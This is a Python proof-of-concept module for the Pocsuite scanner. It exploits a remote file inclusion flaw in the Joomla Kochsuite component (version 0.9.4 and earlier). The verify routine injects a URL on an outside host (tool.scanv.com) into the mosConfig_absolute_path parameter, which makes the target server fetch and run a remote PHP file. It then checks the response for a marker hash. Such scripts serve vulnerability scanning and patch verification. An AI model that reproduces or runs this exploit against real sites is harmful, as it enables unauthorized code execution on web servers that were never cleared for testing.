#!/usr/bin/env python
# coding: utf-8

import re
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register

class Joomla_Kochsuite_Component_Remote_File_Include(POCBase):
    vulID = '63855'
    version = '1'
    vulDate = '2006-10-17'
    author = ' '
    createDate = '2015-12-16'
    updateDate = ' '
    references = ['http://www.sebug.net/vuldb/ssvid-63855']
    name = 'Joomla Kochsuite Component <= 0.9.4 - Remote File Include Vulnerability'
    appPowerLink = ''
    appName = 'Joomla Kochsuite Component'
    appVersion = '<= 0.9.4'
    vulType = 'Remote File Inclusion'
    desc = ''
    samples = ['']


    def _attack(self):
        return self._verify()


    def _verify(self):
        result = {}
        vul_url = '%s/components/com_kochsuite/config.kochsuite.php?mosConfig_absolute_path=http://tool.scanv.com/wsl/php_verify.txt?' % self.url
        response = req.get(vul_url).content

        if re.search('d4d7a6b8b3ed8ed86db2ef2cd728d8ec', response):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url


        return self.parse_attack(result)


    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('failed')

        return output

register(Joomla_Kochsuite_Component_Remote_File_Include)